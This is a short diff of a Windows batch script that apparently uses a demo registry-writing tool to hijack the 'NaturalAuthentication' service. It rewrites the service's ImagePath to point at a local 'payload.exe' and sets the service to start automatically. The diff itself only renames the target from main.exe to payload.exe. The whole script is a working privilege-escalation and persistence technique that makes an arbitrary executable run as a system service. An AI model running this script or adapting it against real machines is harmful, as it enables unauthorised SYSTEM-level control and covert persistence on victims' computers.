@@ -1,5 +1,5 @@
 set base=%~dp0
-set file=%base%main.exe
+set file=%base%payload.exe
 .\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
 .\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" %file%
 .\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Start" 0x2
